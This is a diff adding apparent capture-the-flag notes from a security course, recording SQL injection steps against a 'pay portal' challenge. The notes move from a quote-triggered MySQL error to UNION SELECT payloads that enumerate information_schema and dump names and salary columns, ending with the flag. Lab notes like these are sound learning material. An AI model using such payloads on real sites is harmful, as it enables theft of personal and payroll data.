@@ -1,2 +1,22 @@
 # pay portal 
+" character caused a mysql exception so now I know it is mysql
 
+"Union select 1,2,3,4,5,6,7,8 -> works
+"union select 1,2,3,4,5,6,7,8 from information_schema.tables
+"union select 1,table_name,3,4,5,6,7,8 from information_schema.tables# 
+"union select 1,column_name,3,4,5,6,7,8 from information_schema.columns# 
+
+
+table names of interest:
+payportal
+
+column names:
+first, last, title, period,gross,net
+
+"union select 1,first,last,title,period,gross,net,8 from payportal# 
+COMP6443{SQLiIsPowerful}
+
+
+
+# Support
+/raw/6fbRN72 -> help page
